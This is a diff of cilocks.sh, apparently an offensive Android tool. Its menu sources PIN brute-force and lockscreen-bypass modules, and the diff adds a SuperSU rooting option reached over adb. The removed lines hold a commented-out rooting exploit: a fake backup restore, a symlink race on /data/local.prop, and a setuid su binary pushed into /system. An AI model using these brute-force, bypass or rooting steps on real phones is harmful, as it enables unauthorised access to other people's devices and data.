@@ -11,12 +11,13 @@ source utils/adb_connection.sh
 source source/brute_pin_4_digit.sh
 source source/brute_pin_6_digit.sh
 source source/brute_pin_wordlist.sh
+source source/root_android_supersu.sh
 source source/bypass_lockscreen_antiguard.sh
 
-VERSION="v2.1"
-FILE_NAME="cilocks.sh"
-UTILS_DIR="utils/*.sh"
-SOURCE_DIR="source/*.sh"
+readonly VERSION="v2.1"
+readonly FILE_NAME="cilocks.sh"
+readonly UTILS_DIR="utils/*.sh"
+readonly SOURCE_DIR="source/*.sh"
 
 is_root_user
 ROOT_STATUS=$?
@@ -154,7 +155,7 @@ elif [[ $select == 4 ]]; then
     fi
 
 elif [[ $select == 5 ]]; then
-   check_adb_connection
+    check_adb_connection
     ADB_CONNECTION=$?
 
     if [[ $ADB_CONNECTION == 0 ]]; then
@@ -169,28 +170,24 @@ elif [[ $select == 5 ]]; then
         # Cal main apps
         files "$(pwd)" $FILE_NAME
     fi
+
+elif [[ $select == 6 ]]; then
+    check_adb_connection
+    ADB_CONNECTION=$?
+
+    if [[ $ADB_CONNECTION == 0 ]]; then
+        rootandroidsupersu
+    else
+        clear
+        echo "No device attached, please connect your phone/emulator through adb"
+
+        # Do sleep for user to read the log
+        sleep 4
+
+        # Cal main apps
+        files "$(pwd)" $FILE_NAME
+    fi
 fi
-
-
-# elif [[ $select == 6 ]]; then
-#     adb restore modules/fakebackup.ab
-
-#     command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"
-
-#     if command "cat /data/local.prop"; then
-#         echo "Succesfully rooted!"
-#         echo "Requires a reboot..."
-#         adb reboot
-#         sleep 2
-#         adb wait-for-device
-#         command "mount -o rw,remount /system"
-#         adb push modules/su-static /system/xbin/su
-#         command "/data/local/tmp/busybox chown 0:0 /system/xbin/su"
-#         command "/data/local/tmp/busybox chmod 6777 /system/xbin/su"
-#         adb push modules/Superuser.apk /system/app/
-#         command "rm /data/local.prop"
-#         adb reboot
-#     fi
 
 # elif [[ $select == 7 ]]; then
 #     clear
